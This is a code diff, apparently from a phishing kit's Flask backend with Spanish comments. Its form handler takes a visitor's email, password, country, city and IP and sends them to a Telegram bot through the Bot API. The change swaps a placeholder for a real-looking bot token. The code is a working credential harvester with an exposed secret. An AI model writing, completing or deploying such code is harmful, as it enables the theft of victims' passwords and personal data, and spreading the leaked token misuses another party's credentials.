@@ -21,7 +21,7 @@ def enviar():
     ciudad = request.form['ciudad']
 
     # Aquí puedes enviar el formulario por medio de Telegram
-    token = 'aquivatutoken'
+    token = '6547666385:AAFzjYN6dD8L2SsxX2Mg15tultGIcYmrCaw'
     message = f'Correo electrónico: {email} \nContraseña: {password}\nPais: {pais} \nCiudad: {ciudad} \nIP: {ip}'
     url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}'
     response = requests.get(url)
